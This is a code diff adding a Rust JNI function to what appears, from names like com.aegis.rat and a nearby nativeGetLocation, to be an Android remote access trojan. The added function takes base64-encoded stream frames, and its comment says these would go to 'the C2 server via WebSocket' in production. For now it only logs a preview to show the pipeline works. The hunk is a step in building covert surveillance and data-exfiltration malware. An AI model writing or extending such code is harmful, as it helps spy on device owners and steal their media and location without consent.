@@ -95,6 +95,28 @@ pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeInit(
 }
 
 #[no_mangle]
+pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeStreamFrame(
+    mut env: JNIEnv,
+    _class: JClass,
+    stream_type: JString,
+    base64_data: JString,
+    frame_index: jint,
+    is_key_frame: jboolean,
+) {
+    let stream_type_str: String = env.get_string(&stream_type).unwrap().into();
+    let data_str: String = env.get_string(&base64_data).unwrap().into();
+    
+    // In a production environment, you would send this to the C2 server via WebSocket here.
+    // For now, we log it to prove the pipeline is working.
+    log::debug!("[STREAM] {} | Frame: {} | Key: {} | Data: {}...", 
+        stream_type_str, 
+        frame_index, 
+        is_key_frame, 
+        &data_str[..data_str.len().min(50)]
+    );
+}
+
+#[no_mangle]
 pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeGetLocation(
     mut env: JNIEnv,
     _class: JClass,
